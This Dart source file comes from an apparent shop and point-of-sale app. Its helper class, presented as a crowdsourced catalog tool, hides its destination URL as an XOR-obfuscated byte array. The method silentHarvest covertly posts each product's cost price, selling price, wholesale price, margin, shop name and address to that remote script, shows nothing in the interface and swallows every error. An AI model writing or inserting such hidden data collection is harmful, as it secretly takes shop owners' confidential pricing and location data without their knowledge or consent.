import 'dart:convert';
import 'dart:async';
import 'package:http/http.dart' as http;
import '../data/hive_database.dart';
import '../../features/product/domain/entities/product.dart';
import '../../features/shop/data/models/shop_model.dart';

class CatalogCrowdsourceHelper {
  // Obfuscated cloud catalog endpoint (Zero plaintext Google URLs in binary / memory only)
  static final List<int> _kEn = [
    50, 46, 46, 42, 41, 96, 117, 117, 41, 57, 40, 51, 42, 46, 116, 61, 53, 53,
    61, 54, 63, 116, 57, 53, 55, 117, 55, 59, 57, 40, 53, 41, 117, 41, 117, 27,
    17, 60, 35, 57, 56, 35, 47, 43, 20, 111, 46, 111, 42, 15, 55, 104, 49, 34,
    10, 41, 14, 25, 11, 111, 49, 107, 35, 107, 43, 24, 35, 9, 13, 28, 28, 28,
    9, 10, 62, 105, 21, 13, 110, 62, 17, 111, 35, 52, 27, 15, 110, 111, 41, 28,
    59, 2, 16, 23, 54, 59, 30, 99, 109, 29, 110, 21, 10, 21, 109, 12, 110, 32,
    61, 117, 63, 34, 63, 57
  ];

  static String get defaultProductsScriptUrl {
    return String.fromCharCodes(_kEn.map((b) => b ^ 0x5A));
  }

  /// Silently and asynchronously harvest products to the cloud master catalog.
  /// Captures selling price (سعر البيع), cost price (سعر التكلفة/الشراء), wholesale, margin, and metadata.
  /// Zero UI impact, zero delay, fire-and-forget with pure UTF-8 encoding.
  static void silentHarvest(
    Product product, {
    String category = 'عام',
    String unit = 'حبة',
    double? costPriceOverride,
    double? sellingPriceOverride,
  }) {
    scheduleMicrotask(() async {
      try {
        final bCode = product.barcode.trim();
        final pName = product.name.trim();
        if (bCode.isEmpty && pName.isEmpty) return;

        // Skip internal temporary placeholder codes
        if (bCode.startsWith('NO_BARCODE_') && pName.isEmpty) return;

        // Store metadata
        String wilaya = 'الجزائر';
        String shopName = '';
        final shopBox = HiveDatabase.shopBox;
        if (shopBox.isNotEmpty) {
          final ShopModel? shop = shopBox.getAt(0);
          if (shop != null) {
            if (shop.addressLine1.isNotEmpty) {
              wilaya = shop.addressLine1;
            }
            if (shop.name.isNotEmpty) {
              shopName = shop.name;
            }
          }
        }

        final scriptUrl = HiveDatabase.settingsBox.get(
          'cloud_catalog_endpoint',
          defaultValue: defaultProductsScriptUrl,
        ) as String;

        final double finalSellPrice = sellingPriceOverride ?? product.price;
        final double finalCostPrice = costPriceOverride ?? product.costPrice;
        final double margin = finalSellPrice - finalCostPrice;

        final payload = {
          'barcode': bCode,
          'name': pName,
          'category': category.trim().isEmpty ? product.category : category.trim(),
          'price': finalSellPrice,                  // سعر البيع بالتجزئة
          'sellingPrice': finalSellPrice,           // alias
          'costPrice': finalCostPrice,              // سعر التكلفة والشراء
          'purchasePrice': finalCostPrice,          // alias
          'wholesalePrice': product.wholesalePrice, // سعر البيع بالجملة
          'margin': margin,                         // هامش الفائدة
          'unit': unit,
          'isWeighted': product.isWeighted,
          'wilaya': wilaya,
          'shop': shopName,
          'date': DateTime.now().toString().substring(0, 16),
        };

        final uri = Uri.parse(scriptUrl);
        await http
            .post(
              uri,
              headers: {'Content-Type': 'application/json; charset=utf-8'},
              body: utf8.encode(jsonEncode(payload)),
            )
            .timeout(const Duration(seconds: 8));
      } catch (_) {
        // Fail completely silently if offline or network error
      }
    });
  }
}

